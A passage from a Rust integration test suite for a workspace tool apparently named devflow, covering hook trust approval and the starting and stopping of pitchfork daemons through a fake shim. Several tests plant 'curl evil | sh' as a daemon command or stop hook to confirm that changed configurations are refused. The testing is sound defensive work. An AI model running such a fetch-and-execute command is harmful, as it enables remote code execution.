    env.edit_config("setup = []", "setup = [\"echo ran > hook-ran.txt\"]");
    let doc = json(ok(&env.run(&["--json", "trust", "--yes"])));
    assert_eq!(doc["trust"]["state"], "trusted", "{doc}");
    // What version 1 wrote: the same entry without a `version`.
    let file = env.root.join("config/trust.toml");
    let text = std::fs::read_to_string(&file).unwrap();
    assert!(text.contains("version = 2"), "{text}");
    std::fs::write(
        &file,
        text.lines()
            .filter(|line| !line.starts_with("version"))
            .collect::<Vec<_>>()
            .join("\n"),
    )
    .unwrap();
    let doc = json(ok(&env.run(&["--json", "trust"])));
    assert_eq!(doc["trust"]["state"], "untrusted", "{doc}");
    assert_eq!(doc["trust"]["format_changed"], true, "{doc}");
    assert_eq!(doc["trust"]["previously_trusted"], true, "{doc}");
    let text = stdout(ok(&env.run(&["trust"])));
    assert!(text.contains("approval format changed"), "{text}");
    // It authorizes nothing: the hooks are skipped until it is approved again.
    let out = env.run(&["--json", "--non-interactive", "switch", "-c", "feature/v1"]);
    assert_eq!(out.status.code(), Some(2), "{}", describe(&out));
    assert!(
        !PathBuf::from(json(&out)["path"].as_str().unwrap())
            .join("hook-ran.txt")
            .exists()
    );
    let path = PathBuf::from(json(&out)["path"].as_str().unwrap());
    let doc = json(ok(&env.run(&["--json", "trust", "--yes"])));
    assert_eq!(doc["trust"]["state"], "trusted", "{doc}");
    ok(&env.run_in(&path, &["--json", "--non-interactive", "setup"]));
    assert!(path.join("hook-ran.txt").is_file());
}

#[test]
fn trust_shows_and_approves_the_complete_scope() {
    let env = Env::new();
    env.init();
    env.edit_config(
        "setup = []\nteardown = []",
        "setup = [\"echo SETUP-CMD\"]\nswitch = [\"echo SWITCH-CMD\"]\nteardown = [\"echo TEARDOWN-CMD\"]",
    );

    let doc = json(ok(&env.run(&["--json", "trust"])));
    assert_eq!(doc["approved"], false);
    assert_eq!(doc["scope"]["version"], 2, "{doc}");
    assert_eq!(
        doc["scope"]["hooks"]["setup"][0]["run"], "echo SETUP-CMD",
        "{doc}"
    );
    assert_eq!(
        doc["scope"]["hooks"]["switch"][0]["run"], "echo SWITCH-CMD",
        "{doc}"
    );
    assert_eq!(
        doc["scope"]["hooks"]["teardown"][0]["run"], "echo TEARDOWN-CMD",
        "{doc}"
    );
    assert_eq!(doc["scope"]["hooks"]["setup"][0]["timeout"], "15m", "{doc}");
    assert!(doc["scope"]["hooks"]["timeout"].as_str().is_some(), "{doc}");
    assert!(
        doc["scope"]["env"]["vars"].as_object().unwrap().is_empty(),
        "{doc}"
    );
    assert!(
        doc["scope"]["processes"]["layers"]
            .as_array()
            .unwrap()
            .is_empty(),
        "{doc}"
    );
    let digest = doc["scope"]["digest"].as_str().unwrap().to_string();
    assert_eq!(digest.len(), 64);

    // Not trusted: the human listing shows everything the approval would cover.
    let out = ok(&env.run(&["trust"])).clone();
    let text = stdout(&out);
    for needle in ["SETUP-CMD", "SWITCH-CMD", "TEARDOWN-CMD", "timeout:"] {
        assert!(text.contains(needle), "{needle} missing:\n{text}");
    }
    assert!(text.contains("not trusted"), "{text}");

    // --yes prints the scope it approved.
    let out = ok(&env.run(&["trust", "--yes"])).clone();
    let text = stdout(&out);
    for needle in [
        "SETUP-CMD",
        "SWITCH-CMD",
        "TEARDOWN-CMD",
        "timeout:",
        "Approved.",
    ] {
        assert!(text.contains(needle), "{needle} missing:\n{text}");
    }
    let doc = json(ok(&env.run(&["--json", "trust"])));
    assert_eq!(doc["trust"]["state"], "trusted", "{doc}");
    assert_eq!(doc["scope"]["digest"], digest.as_str());

    // Editing only the teardown hooks needs a new approval.
    env.edit_config("echo TEARDOWN-CMD", "echo OTHER-TEARDOWN");
    let doc = json(ok(&env.run(&["--json", "trust"])));
    assert_eq!(doc["trust"]["state"], "untrusted", "{doc}");
    assert_eq!(doc["trust"]["previously_trusted"], true, "{doc}");
}

// --- pitchfork: up, down, ps, install, doctor --------------------------------
//
// Every test runs against a fake `pitchfork` (tests/support/fake-pitchfork.sh)
// placed first on PATH in a temporary directory. Nothing touches a real
// pitchfork or its supervisor.

const FAKE_PITCHFORK: &str = include_str!("support/fake-pitchfork.sh");
const DAEMON_FILE: &str = "[daemons.web]\nrun = \"bun run dev\"\nport = 3000\n";

/// A directory holding the fake `pitchfork` and the files that steer it.
struct FakePitchfork {
    dir: PathBuf,
}

impl FakePitchfork {
    fn set(&self, name: &str, content: &str) {
        std::fs::write(self.dir.join(name), content).unwrap();
    }

    fn calls(&self) -> Vec<(String, String)> {
        std::fs::read_to_string(self.dir.join("calls.log"))
            .unwrap_or_default()
            .lines()
            .map(|line| {
                let mut parts = line.splitn(3, '|');
                (
                    parts.next().unwrap_or("").to_string(),
                    parts.next().unwrap_or("").to_string(),
                )
            })
            .collect()
    }

    fn mutations(&self) -> Vec<String> {
        self.calls()
            .into_iter()
            .map(|(_, args)| args)
            .filter(|args| !args.contains("--help"))
            .filter(|args| args.starts_with("start") || args.starts_with("stop"))
            .collect()
    }
}

impl Env {
    fn fake_pitchfork(&self) -> FakePitchfork {
        let dir = self.root.join("fake-pitchfork-bin");
        std::fs::create_dir_all(&dir).unwrap();
        let program = dir.join("pitchfork");
        std::fs::write(&program, FAKE_PITCHFORK).unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&program, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        FakePitchfork { dir }
    }

    /// Run with the fake first on PATH (the system directories stay for `sh`).
    fn run_fake(&self, fake: &FakePitchfork, dir: &Path, args: &[&str]) -> Output {
        let mut command = self.command(dir);
        command
            .args(args)
            .env("PATH", format!("{}:/usr/bin:/bin", fake.dir.display()));
        command.output().unwrap()
    }

    /// Commit `file` with `content` in the main checkout.
    fn commit_file(&self, file: &str, content: &str) {
        std::fs::write(self.repo.join(file), content).unwrap();
        let git = git2::Repository::open(&self.repo).unwrap();
        let mut index = git.index().unwrap();
        index.add_path(Path::new(file)).unwrap();
        index.write().unwrap();
        let tree = git.find_tree(index.write_tree().unwrap()).unwrap();
        let sig = git2::Signature::now("Test", "test@example.com").unwrap();
        let parent = git.head().unwrap().peel_to_commit().unwrap();
        git.commit(Some("HEAD"), &sig, &sig, file, &tree, &[&parent])
            .unwrap();
    }

    /// A project with a committed daemon, approved in the main checkout, and a
    /// ready workspace `feature/p`. Returns its path and its pitchfork namespace.
    fn workspace_with_daemon(&self, fake: &FakePitchfork) -> (PathBuf, String) {
        self.workspace_with_pitchfork_file(fake, DAEMON_FILE)
    }

    /// [`Env::workspace_with_daemon`] with the committed `pitchfork.toml` given.
    fn workspace_with_pitchfork_file(
        &self,
        fake: &FakePitchfork,
        pitchfork_toml: &str,
    ) -> (PathBuf, String) {
        self.init();
        self.commit_file("pitchfork.toml", pitchfork_toml);
        ok(&self.run(&["--json", "trust", "--yes"]));
        let out = self.run_fake(
            fake,
            &self.repo,
            &["--json", "--non-interactive", "switch", "-c", "feature/p"],
        );
        ok(&out);
        let doc = json(&out);
        assert_eq!(doc["status"], "ready", "{doc}");
        let path = PathBuf::from(doc["path"].as_str().unwrap());
        (path.clone(), namespace_in(&path))
    }
}

fn namespace_in(worktree: &Path) -> String {
    let text = std::fs::read_to_string(worktree.join("pitchfork.local.toml")).unwrap();
    text.lines()
        .find_map(|line| line.strip_prefix("namespace = \""))
        .and_then(|rest| rest.strip_suffix('"'))
        .unwrap_or_else(|| panic!("no namespace in:\n{text}"))
        .to_string()
}

fn daemon(namespace: &str, status: &str, pid: Option<u32>) -> Value {
    json!({
        "id": format!("{namespace}/web"), "namespace": namespace, "name": "web", "pid": pid,
        "status": status, "error": null, "port": [3000], "url": null, "proxy_url": null
    })
}

#[test]
fn the_process_commands_are_listed() {
    let env = Env::new();
    let text = stdout(ok(&env.run(&["--help"])));
    for command in ["up", "down", "ps", "pitchfork"] {
        assert!(
            text.lines()
                .any(|line| line.trim_start().starts_with(&format!("{command} "))),
            "`{command}` missing from --help:\n{text}"
        );
    }
    let text = stdout(ok(&env.run(&["pitchfork", "--help"])));
    for command in ["status", "install", "proxy"] {
        assert!(
            text.contains(command),
            "`pitchfork {command}` missing:\n{text}"
        );
    }
}

#[test]
fn a_workspace_gets_its_own_pitchfork_namespace_and_nothing_else_in_the_file() {
    let env = Env::new();
    let fake = env.fake_pitchfork();
    let (path, namespace) = env.workspace_with_daemon(&fake);
    assert!(namespace.starts_with("df-"), "{namespace}");
    let text = std::fs::read_to_string(path.join("pitchfork.local.toml")).unwrap();
    let body: Vec<&str> = text
        .lines()
        .filter(|l| !l.starts_with('#') && !l.is_empty())
        .collect();
    assert_eq!(body.len(), 2, "{text}");
    assert!(body[1].starts_with("worktree_label = "), "{text}");
    // Git does not see it, here or in the main checkout's exclude file.
    let exclude = std::fs::read_to_string(env.repo.join(".git/info/exclude")).unwrap();
    assert_eq!(
        exclude.matches("pitchfork.local.toml").count(),
        1,
        "{exclude}"
    );
    // Approving the main checkout's scope still covers the worktree.
    let doc = json(ok(&env.run_in(&path, &["--json", "trust"])));
    assert_eq!(doc["trust"]["state"], "trusted", "{doc}");
}

#[test]
fn up_starts_the_approved_workspace_and_reports_the_state_pitchfork_gives_back() {
    let env = Env::new();
    let fake = env.fake_pitchfork();
    let (path, namespace) = env.workspace_with_daemon(&fake);
    fake.set(
        "after_start.json",
        &serde_json::to_string(&json!([daemon(&namespace, "running", Some(4242))])).unwrap(),
    );
    fake.set(
        "proxy.json",
        &serde_json::to_string(&json!({
            "enabled": true, "scheme": "https", "tld": "localhost", "port": 443, "trusted": true,
            "projects": [{
                "project": namespace, "dir": path.canonicalize().unwrap(),
                "daemons": [{"daemon": "web", "url": "https://web.feature-p.localhost", "port": 3000}]
            }]
        }))
        .unwrap(),
    );
    let out = env.run_fake(&fake, &env.repo, &["--json", "up", "feature/p"]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["command"], "up", "{doc}");
    assert_eq!(doc["ok"], true, "{doc}");
    assert_eq!(doc["action"], "start", "{doc}");
    assert_eq!(doc["namespace"]["value"], namespace.as_str(), "{doc}");
    let web = &doc["daemons"][0];
    assert_eq!(web["name"], "web", "{doc}");
    assert_eq!(web["state"], "running", "{doc}");
    assert_eq!(web["pid"], 4242, "{doc}");
    assert_eq!(web["ports"], json!([3000]), "{doc}");
    assert_eq!(web["url"], "https://web.feature-p.localhost", "{doc}");
    assert_eq!(fake.mutations(), [format!("start -q {namespace}/web")]);
    let start = fake
        .calls()
        .into_iter()
        .find(|c| c.1.starts_with("start"))
        .unwrap();
    assert!(
        same_path(&start.0, &path),
        "run in the worktree: {}",
        start.0
    );

    // The table: daemon, state, port, URL.
    let out = env.run_fake(&fake, &path, &["ps"]);
    ok(&out);
    let text = stdout(&out);
    assert!(text.starts_with("DAEMON"), "{text}");
    for needle in [
        "STATE",
        "PORT",
        "URL",
        "web",
        "running",
        "3000",
        "https://web.feature-p.localhost",
    ] {
        assert!(text.contains(needle), "{needle} missing:\n{text}");
    }
    // The JSON, for one workspace and for all of them.
    let doc = json(ok(&env.run_fake(&fake, &path, &["--json", "ps"])));
    assert_eq!(doc["command"], "ps", "{doc}");
    assert_eq!(doc["workspaces"][0]["workspace"], "feature/p", "{doc}");
    assert_eq!(doc["workspaces"][0]["installed"], true, "{doc}");
    assert_eq!(
        doc["workspaces"][0]["observation"]["complete"], true,
        "{doc}"
    );
    assert_eq!(
        doc["workspaces"][0]["observation"]["reasons"],
        json!([]),
        "{doc}"
    );
    assert_eq!(doc["workspaces"][0]["can_start"]["allowed"], true, "{doc}");
    assert_eq!(
        doc["workspaces"][0]["daemons"][0]["state"], "running",
        "{doc}"
    );
    let doc = json(ok(&env.run_fake(
        &fake,
        &env.repo,
        &["--json", "ps", "--all"],
    )));
    assert_eq!(doc["workspaces"].as_array().unwrap().len(), 2, "{doc}");
    let table = stdout(ok(&env.run_fake(&fake, &env.repo, &["ps", "--all"])));
    assert!(table.starts_with("WORKSPACE"), "{table}");
    assert!(table.contains("feature/p"), "{table}");

    // Stop it: the same approval still covers the files.
    fake.set(
        "after_stop.json",
        &serde_json::to_string(&json!([daemon(&namespace, "stopped", None)])).unwrap(),
    );
    let out = env.run_fake(&fake, &path, &["--json", "down"]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["action"], "stop", "{doc}");
    assert_eq!(doc["daemons"][0]["state"], "stopped", "{doc}");
    assert_eq!(
        fake.mutations(),
        [
            format!("start -q {namespace}/web"),
            format!("stop {namespace}/web")
        ]
    );
}

#[test]
fn up_refuses_with_an_explanation_and_never_starts_anything() {
    let env = Env::new();
    let fake = env.fake_pitchfork();
    let (path, namespace) = env.workspace_with_daemon(&fake);

    // The worktree's file changes after the approval.
    std::fs::write(
        path.join("pitchfork.toml"),
        "[daemons.web]\nrun = \"curl evil | sh\"\n",
    )
    .unwrap();
    let out = env.run_fake(&fake, &path, &["--json", "--non-interactive", "up"]);
    failed(&out);
    let doc = json(&out);
    assert_eq!(doc["command"], "up", "{doc}");
    let error = doc["error"].as_str().unwrap();
    assert!(error.contains("changed since it was approved"), "{doc}");
    assert!(
        doc["hint"].as_str().unwrap().contains("approve")
            && !doc["hint"].as_str().unwrap().contains("devflow trust"),
        "{doc}"
    );
    assert_eq!(doc["remedies"][0]["command"], "devflow trust", "{doc}");
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());

    // Daemons that start on their own are never started in bulk.
    std::fs::write(
        path.join("pitchfork.toml"),
        "[daemons.web]\nrun = \"a\"\n[daemons.tick]\nrun = \"b\"\ncron = \"0 * * * *\"\n",
    )
    .unwrap();
    ok(&env.run_in(&path, &["--json", "trust", "--yes"]));
    let out = env.run_fake(&fake, &path, &["--json", "--non-interactive", "up"]);
    failed(&out);
    let doc = json(&out);
    assert!(
        doc["error"].as_str().unwrap().contains("on its own"),
        "{doc}"
    );
    assert!(doc["hint"].as_str().unwrap().contains("--daemon"), "{doc}");
    assert!(fake.mutations().is_empty());
    // A plain daemon by name is allowed.
    ok(&env.run_fake(
        &fake,
        &path,
        &["--json", "--non-interactive", "up", "--daemon", "web"],
    ));
    assert_eq!(fake.mutations(), [format!("start -q {namespace}/web")]);
    // And `ps` explains why the bulk start is off.
    let doc = json(ok(&env.run_fake(&fake, &path, &["--json", "ps"])));
    assert_eq!(doc["workspaces"][0]["can_start"]["allowed"], false, "{doc}");
    assert_eq!(
        doc["workspaces"][0]["can_start"]["refusal"]["kind"], "autonomous_triggers",
        "{doc}"
    );
}

#[test]
fn ps_and_up_agree_about_a_daemon_that_relies_on_mise() {
    // The reproduction: `ps --json` said `can_start.allowed` for a daemon with
    // `mise = true` that mise does not hand `.devflow/env`, and `up` refused it.
    // (No mise is on the PATH `run_fake` gives, which `up` and `ps` both ask.)
    let env = Env::new();
    let fake = env.fake_pitchfork();
    let (path, namespace) = env.workspace_with_pitchfork_file(
        &fake,
        "[daemons.web]\nrun = \"bun run dev\"\nport = 3000\nmise = true\n",
    );
    let doc = json(ok(&env.run_fake(&fake, &path, &["--json", "ps"])));
    let status = &doc["workspaces"][0];
    assert_eq!(status["can_start"]["allowed"], false, "{doc}");
    assert_eq!(
        status["can_start"]["refusal"]["kind"], "mise_delivery",
        "{doc}"
    );
    assert_eq!(status["daemons"][0]["startable"], false, "{doc}");
    let out = env.run_fake(&fake, &path, &["--json", "--non-interactive", "up"]);
    failed(&out);
    let up = json(&out);
    assert!(
        up["error"]
            .as_str()
            .unwrap()
            .contains("get the workspace's variables through mise"),
        "{up}"
    );
    assert_eq!(
        status["can_start"]["reason"].as_str().unwrap(),
        up["error"].as_str().unwrap(),
        "ps says what up says"
    );
    assert!(
        up["hint"].as_str().unwrap().contains("devflow exec"),
        "{up}"
    );
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());

    // Wrapped in `devflow exec`, the shape `init` proposes, both allow it.
    std::fs::write(
        path.join("pitchfork.toml"),
        "[daemons.web]\nrun = \"devflow exec -- bun run dev\"\nport = 3000\nmise = true\n",
    )
    .unwrap();
    ok(&env.run_in(&path, &["--json", "trust", "--yes"]));
    let doc = json(ok(&env.run_fake(&fake, &path, &["--json", "ps"])));
    assert_eq!(doc["workspaces"][0]["can_start"]["allowed"], true, "{doc}");
    fake.set(
        "after_start.json",
        &serde_json::to_string(&json!([daemon(&namespace, "running", Some(4242))])).unwrap(),
    );
    ok(&env.run_fake(&fake, &path, &["--json", "--non-interactive", "up"]));
    assert_eq!(fake.mutations(), [format!("start -q {namespace}/web")]);
}

#[test]
fn the_daemon_init_proposes_for_a_project_with_mise_passes_up() {
    // The reproduction: in a project without services, `init --accept
    // daemon:web` wrote `run = "bun run dev"` with `mise = true`, which `up`
    // refused because mise does not load `.devflow/env`.
    let env = Env::new();
    for (path, text) in [
        (
            "package.json",
            r#"{"name":"shop","scripts":{"dev":"vite"},"devDependencies":{"vite":"5"}}"#,
        ),
        ("bun.lock", "{}\n"),
        ("vite.config.ts", "export default {};\n"),
        ("mise.toml", "[tools]\nnode = \"22\"\nbun = \"1.2\"\n"),
    ] {
        std::fs::write(env.repo.join(path), text).unwrap();
    }
    ok(&env.run(&[
        "--json",
        "init",
        "--yes",
        "--name",
        "shop",
        "--accept",
        "daemon:web",
    ]));
    let pitchfork = std::fs::read_to_string(env.repo.join("pitchfork.toml")).unwrap();
    assert!(
        pitchfork.contains("run = \"devflow exec -- bun run dev")
            && pitchfork.contains("mise = true"),
        "{pitchfork}"
    );
    // (The written files are committed, as the project's would be.)
    for file in [
        "package.json",
        "bun.lock",
        "vite.config.ts",
        "mise.toml",
        "devflow.toml",
        "pitchfork.toml",
    ] {
        let text = std::fs::read_to_string(env.repo.join(file)).unwrap();
        env.commit_file(file, &text);
    }
    ok(&env.run(&["--json", "trust", "--yes"]));
    let fake = env.fake_pitchfork();
    let out = env.run_fake(
        &fake,
        &env.repo,
        &[
            "--json",
            "--non-interactive",
            "switch",
            "-c",
            "feature/m",
            "--no-hooks",
        ],
    );
    ok(&out);
    let path = PathBuf::from(json(&out)["path"].as_str().unwrap());
    let doc = json(ok(&env.run_fake(&fake, &path, &["--json", "ps"])));
    assert_eq!(
        doc["workspaces"][0]["can_start"]["allowed"], true,
        "init's own proposal passes the gate up applies: {doc}"
    );
}

#[test]
fn process_remedies_name_the_resolved_workspace_not_the_callers_directory() {
    let env = Env::new();
    let fake = env.fake_pitchfork();
    let (path, namespace) = env.workspace_with_daemon(&fake);
    std::fs::write(
        path.join("pitchfork.toml"),
        "[daemons.web]\nrun = \"curl evil | sh\"\n",
    )
    .unwrap();
    let wanted = path.canonicalize().unwrap();

    // From the main checkout, naming the workspace.
    let out = env.run_fake(
        &fake,
        &env.repo,
        &["--json", "--non-interactive", "up", "feature/p"],
    );
    failed(&out);
    let doc = json(&out);
    let remedy = &doc["remedies"][0];
    assert_eq!(remedy["kind"], "trust", "{doc}");
    assert!(
        same_path(remedy["workspace"].as_str().unwrap(), &wanted),
        "the remedy names {} instead of the workspace: {doc}",
        remedy["workspace"]
    );
    assert!(
        !same_path(remedy["workspace"].as_str().unwrap(), &env.repo),
        "{doc}"
    );

    // `down` too, from the main checkout.
    fake.set(
        "list.json",
        &serde_json::to_string(&json!([daemon(&namespace, "running", Some(7))])).unwrap(),
    );
    std::fs::write(
        path.join("pitchfork.toml"),
        "[daemons.web]\nrun = \"a\"\n[daemons.web.hooks]\non_stop = \"curl evil | sh\"\n",
    )
    .unwrap();
    let out = env.run_fake(&fake, &env.repo, &["--json", "down", "feature/p"]);
    failed(&out);
    let doc = json(&out);
    assert_eq!(doc["remedies"][0]["kind"], "trust", "{doc}");
    assert!(
        same_path(doc["remedies"][0]["workspace"].as_str().unwrap(), &wanted),
        "{doc}"
    );
    assert!(fake.mutations().is_empty());
}

#[test]
fn down_refuses_a_changed_configuration_unless_forced() {
    let env = Env::new();
    let fake = env.fake_pitchfork();
    let (path, namespace) = env.workspace_with_daemon(&fake);
    fake.set(
        "list.json",
        &serde_json::to_string(&json!([daemon(&namespace, "running", Some(7))])).unwrap(),
    );
    std::fs::write(
        path.join("pitchfork.toml"),
        "[daemons.web]\nrun = \"a\"\n[daemons.web.hooks]\non_stop = \"curl evil | sh\"\n",
    )
    .unwrap();
    let out = env.run_fake(&fake, &path, &["--json", "down"]);
    failed(&out);
    let doc = json(&out);
    assert!(
        doc["error"].as_str().unwrap().contains("lifecycle hooks"),
        "{doc}"
    );
    assert!(doc["hint"].as_str().unwrap().contains("forcing"), "{doc}");
    assert_eq!(doc["remedies"][0]["kind"], "trust", "{doc}");
    assert_eq!(doc["remedies"][0]["command"], "devflow trust", "{doc}");
    assert!(fake.mutations().is_empty());
    fake.set(
        "after_stop.json",
        &serde_json::to_string(&json!([daemon(&namespace, "stopped", None)])).unwrap(),
    );
    ok(&env.run_fake(&fake, &path, &["--json", "down", "--force"]));
    assert_eq!(fake.mutations(), [format!("stop {namespace}/web")]);
}

#[test]
fn autostart_starts_after_switch_and_reports_it_apart_from_readiness() {
    let env = Env::new();
    let fake = env.fake_pitchfork();
    env.init();
    env.commit_file("pitchfork.toml", DAEMON_FILE);
    let config = std::fs::read_to_string(env.config_path()).unwrap();
    std::fs::write(
        env.config_path(),
        format!("{config}\n[pitchfork]\nautostart = true\n"),
    )
    .unwrap();

    // Not approved yet: the workspace is ready, the daemons are not started, and
    // the document says why.
    let out = env.run_fake(
        &fake,
        &env.repo,
        &[
            "--json",
            "--non-interactive",
            "switch",
            "-c",
            "feature/auto",
        ],
    );
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["status"], "ready", "{doc}");
    assert!(
        doc["processes"]["skipped"]
            .as_str()
            .unwrap()
            .contains("review and approve"),
        "{doc}"
    );
    assert!(fake.mutations().is_empty());

    // Approved: the next switch into the ready workspace starts them.
    ok(&env.run(&["--json", "trust", "--yes"]));
    let out = env.run_fake(
        &fake,
        &env.repo,
        &["--json", "--non-interactive", "switch", "feature/auto"],
    );
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["status"], "ready", "{doc}");
    assert_eq!(doc["processes"]["report"]["ran"], true, "{doc}");
    let namespace = namespace_in(Path::new(doc["path"].as_str().unwrap()));
    assert_eq!(fake.mutations(), [format!("start -q {namespace}/web")]);

    // A start that fails is reported and does not change the exit code.
    fake.set("start_fail", "boom\n");
    let out = env.run_fake(
        &fake,
        &env.repo,
        &["--json", "--non-interactive", "switch", "feature/auto"],
    );
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["status"], "ready", "{doc}");
    assert_eq!(doc["processes"]["report"]["ran"], false, "{doc}");
    assert!(
        doc["processes"]["report"]["error"]
            .as_str()
            .unwrap()
            .contains("boom")
    );
}

#[test]
fn remove_stops_the_workspaces_daemons_first() {
    let env = Env::new();
    let fake = env.fake_pitchfork();
    let (path, namespace) = env.workspace_with_daemon(&fake);
    fake.set(
        "list.json",
        &serde_json::to_string(&json!([daemon(&namespace, "running", Some(9))])).unwrap(),
    );
    fake.set(
        "after_stop.json",
        &serde_json::to_string(&json!([daemon(&namespace, "stopped", None)])).unwrap(),
    );
    let out = env.run_fake(&fake, &env.repo, &["--json", "remove", "feature/p"]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(
        doc["stopped_daemons"],
        json!([format!("{namespace}/web")]),
        "{doc}"
    );
    assert_eq!(fake.mutations(), [format!("stop {namespace}/web")]);
    assert!(!path.exists());

    // Changed configuration, still running: refused without --force, stopped with it.
    let out = env.run_fake(
        &fake,
        &env.repo,
        &["--json", "--non-interactive", "switch", "-c", "feature/q"],
    );
    ok(&out);
    let path = PathBuf::from(json(&out)["path"].as_str().unwrap());
    let namespace = namespace_in(&path);
    fake.set(
        "list.json",
        &serde_json::to_string(&json!([daemon(&namespace, "running", Some(9))])).unwrap(),
    );
    std::fs::write(
        path.join("pitchfork.toml"),
        "[daemons.web]\nrun = \"other\"\n",
    )
    .unwrap();
    // Committed there, so no other protection is in the way.
    let git = git2::Repository::open(&path).unwrap();
    let mut index = git.index().unwrap();
    index.add_path(Path::new("pitchfork.toml")).unwrap();
    index.write().unwrap();
    let tree = git.find_tree(index.write_tree().unwrap()).unwrap();
    let sig = git2::Signature::now("Test", "test@example.com").unwrap();
    let parent = git.head().unwrap().peel_to_commit().unwrap();
    git.commit(Some("HEAD"), &sig, &sig, "other daemon", &tree, &[&parent])
        .unwrap();
    let out = env.run_fake(&fake, &env.repo, &["--json", "remove", "feature/q"]);
    failed(&out);
    let doc = json(&out);
    assert!(
        doc["error"].as_str().unwrap().contains("pitchfork daemons"),
        "{doc}"
    );
    assert!(path.exists());
    let before = fake.mutations().len();
    ok(&env.run_fake(
        &fake,
        &env.repo,
        &["--json", "remove", "feature/q", "--force"],
    ));
    assert_eq!(fake.mutations().len(), before + 1);
    assert!(!path.exists());
}

#[test]
fn pitchfork_status_reports_install_version_supervisor_and_proxy() {
    let env = Env::new();
    let fake = env.fake_pitchfork();
    let status = |args: &[&str]| env.run_fake(&fake, &env.repo, args);
    let doc = json(ok(&status(&["--json", "pitchfork", "status"])));
    assert_eq!(doc["command"], "pitchfork status", "{doc}");
    assert_eq!(doc["pitchfork"]["installed"], true, "{doc}");
    assert_eq!(doc["pitchfork"]["version"], "2.29.0", "{doc}");
    assert_eq!(doc["usable"], true, "{doc}");
    assert_eq!(doc["supervisor_up"], true, "{doc}");
    assert_eq!(doc["proxy"]["enabled"], false, "{doc}");
    assert!(
        doc["proxy_commands"].as_array().unwrap().len() >= 3,
        "{doc}"
    );
    assert!(doc.get("install").is_none(), "nothing to install: {doc}");

    // A shim with no version configured is on PATH and executable, and not installed.
    fake.set("version_exit", "1");
    let doc = json(ok(&status(&["--json", "pitchfork", "status"])));
    assert_eq!(doc["pitchfork"]["installed"], false, "{doc}");
    assert!(doc["pitchfork"]["path"].is_string(), "{doc}");
    assert_eq!(doc["usable"], false, "{doc}");
    assert!(
        doc["conflicts"]
            .as_array()
            .unwrap()
            .iter()
            .any(|c| c.as_str().unwrap().contains("No version is set for shim")),
        "{doc}"
    );
    assert!(
        doc["install"]["commands"].as_array().unwrap().len() >= 2,
        "{doc}"
    );

    // Missing features are named.
    std::fs::remove_file(fake.dir.join("version_exit")).unwrap();
    fake.set("missing", "proxy status --json\n");
    let doc = json(ok(&status(&["--json", "pitchfork", "status"])));
    assert_eq!(doc["usable"], false, "{doc}");
    assert_eq!(
        doc["pitchfork"]["missing_features"],
        json!(["proxy status --json"]),
        "{doc}"
    );

    // The human form.
    std::fs::remove_file(fake.dir.join("missing")).unwrap();
    fake.set("supervisor_down", "1");
    let text = stdout(ok(&status(&["pitchfork", "status"])));
    for needle in [
        "pitchfork",
        "2.29.0",
        "supervisor",
        "not running",
        "proxy",
        "off",
    ] {
        assert!(text.contains(needle), "{needle} missing:\n{text}");
    }
}

#[test]
fn the_proxy_is_only_ever_printed() {
    let env = Env::new();
    let fake = env.fake_pitchfork();
    let doc = json(ok(&env.run_fake(
        &fake,
        &env.repo,
        &["--json", "pitchfork", "proxy"],
    )));
    assert_eq!(doc["ran"], false, "{doc}");
    let commands: Vec<&str> = doc["commands"]
        .as_array()
        .unwrap()
        .iter()
        .map(|c| c.as_str().unwrap())
        .collect();
    assert!(
        commands.iter().any(|c| c.contains("proxy setup")),
        "{commands:?}"
    );
    let text = stdout(ok(&env.run_fake(&fake, &env.repo, &["pitchfork", "proxy"])));
    assert!(text.contains("pitchfork proxy setup"), "{text}");
    assert!(
        text.contains("devflow does not change your proxy"),
        "{text}"
    );
    // Only queries reached the fake.
    assert!(fake.mutations().is_empty());
    assert!(
        fake.calls().iter().all(|(_, args)| !args.contains("setup")),
        "{:?}",
        fake.calls()
    );
}

#[test]
fn install_asks_first_and_runs_mise_only_when_confirmed() {
    let env = Env::new();
    let fake = env.fake_pitchfork();
    fake.set("version_exit", "1");
    // A fake mise that "installs" pitchfork by removing the shim's failure.
    let mise = env.fake_program(
        "mise",
        &format!(
            "echo \"$*\" >> \"$FAKE_LOG\"\nrm -f {}",
            fake.dir.join("version_exit").display()
        ),
    );
    let run = |args: &[&str]| {
        let mut command = env.command(&env.repo);
        command.args(args).env(
            "PATH",
            format!(
                "{}:{}:/usr/bin:/bin",
                mise.dir.display(),
                fake.dir.display()
            ),
        );
        command.env("FAKE_LOG", &mise.log);
        command.output().unwrap()
    };

    // JSON and non-interactive runs never prompt and never install.
    let doc = json(ok(&run(&["--json", "pitchfork", "install"])));
    assert_eq!(doc["ran"], false, "{doc}");
    assert_eq!(doc["needs_confirmation"], true, "{doc}");
    assert_eq!(
        doc["plan"]["run"],
        json!(["mise", "use", "-g", "pitchfork@latest"]),
        "{doc}"
    );
    assert!(!mise.log.exists(), "mise was not run");
    let text = stdout(ok(&run(&["--non-interactive", "pitchfork", "install"])));
    assert!(text.contains("mise use -g pitchfork@latest"), "{text}");
    assert!(text.contains("--yes"), "{text}");
    assert!(!mise.log.exists());

    // Confirmed: mise runs, and the result is detected again.
    let doc = json(ok(&run(&["--json", "pitchfork", "install", "--yes"])));
    assert_eq!(doc["ran"], true, "{doc}");
    assert_eq!(doc["ok"], true, "{doc}");
    assert_eq!(doc["pitchfork"]["installed"], true, "{doc}");
    assert_eq!(mise.lines(), ["use -g pitchfork@latest"]);

    // Already installed: nothing to do.
    let doc = json(ok(&run(&["--json", "pitchfork", "install", "--yes"])));
    assert_eq!(doc["already_installed"], true, "{doc}");
    assert_eq!(doc["ran"], false, "{doc}");
    assert_eq!(mise.lines().len(), 1);
}

#[test]
fn install_without_mise_prints_instructions() {
    let env = Env::new();
    let fake = env.fake_pitchfork();
    fake.set("version_exit", "1");
    let mut command = env.command(&env.repo);
    command
        .args(["--json", "pitchfork", "install", "--yes"])
        .env("PATH", format!("{}:/usr/bin:/bin", fake.dir.display()));
    let doc = json(ok(&command.output().unwrap()));
